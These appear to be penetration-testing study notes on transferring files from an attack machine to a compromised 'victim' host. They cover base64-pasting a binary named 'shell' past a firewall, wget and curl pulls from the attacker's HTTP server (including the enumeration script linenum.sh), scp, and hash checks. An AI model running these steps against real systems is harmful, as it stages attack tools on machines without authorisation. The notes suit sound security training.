## Transferring Files

#### Using Base64 encoding
- Sometimes it may not be possible to transfer a file because a firewall might block the connection or don't let us download files.
- Encode the file to `base64` format and paste it on the victim machine and then decode it.
- To transfer a file called shell from our machine to victim machine
    - Our machine:
    ```bash
    $ base64 shell -w 0
    f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
    ```
    - Paste this using echo and decode it and put the output in a file called shell.
    ```bash
    user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
    ```
#### Using Wget or cURL
- On our machine go to the dir that contains the file that you want to transfer to the victim machine and run a `python http server`
```bash
$ cd /tmp
$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- On the victim machine run wget
```sh
$ wget http://10.10.10.14:8000/some_file.sh
...SNIP...
Saving to: 'some_file.sh'

some_file.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'some_file.sh' saved [14337/14337]
```
- Here the IP and port numbers specified are our attack machine's.

- If there is no wget, user `cURL`
```sh
$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

#### Using scp if you already have ssh
```sh
$ scp linenum.sh user@remotehost:/tmp/linenum.sh
user@remotehost's password: *********
linenum.sh
```
### Validating File Transfers 
1. Using MD5 hash
- To validate that the `base64` or other files you transfered are not broken, use `md5` hash on both your and victim's machine.
```sh
$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
2. Using file
- You can validate the format of a file
```sh
$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```
- An ELF format means success
